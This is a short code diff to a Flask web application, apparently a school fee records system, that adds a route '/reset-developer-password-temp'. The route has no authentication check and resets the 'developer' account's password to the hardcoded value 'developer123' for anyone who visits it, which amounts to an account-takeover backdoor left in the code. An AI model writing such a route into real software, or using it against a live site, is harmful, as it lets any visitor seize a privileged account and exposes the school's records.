@@ -1206,6 +1206,18 @@ def delete_school_fee(id):
     return redirect(url_for("auth.school_fee_records"))
 
 
+@auth.route("/reset-developer-password-temp")
+def reset_developer_password_temp():
+
+    developer = User.query.filter_by(username="developer").first()
+
+    if developer:
+        developer.password_hash = generate_password_hash("developer123")
+        db.session.commit()
+        return "Developer password has been reset successfully."
+
+    return "Developer account not found."
+
 
 
 
